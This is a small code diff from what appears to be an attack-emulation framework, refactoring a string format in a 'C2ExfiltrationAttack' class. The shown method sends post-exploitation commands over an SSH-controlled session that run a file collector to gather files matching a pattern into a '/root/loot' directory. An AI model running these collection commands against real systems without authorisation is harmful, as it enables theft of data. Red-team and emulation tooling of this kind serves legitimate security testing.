@@ -70,8 +70,9 @@ class C2ExfiltrationAttack(Attack):
             self.handler.shutdown()
 
     def _collect_files(self):
+        path = self.options.path
+        pattern = self.options.pattern
         self.ssh_client.write_lines(self.handler.stdin, [
-            "run file_collector -r -d {path} -f {pattern} -o /root/loot/files.txt".format(
-                path=self.options.path, pattern=self.options.pattern),
+            f"run file_collector -r -d {path} -f {pattern} -o /root/loot/files.txt",
             "run file_collector -i /root/loot/files.txt -l /root/loot",
             "background"])
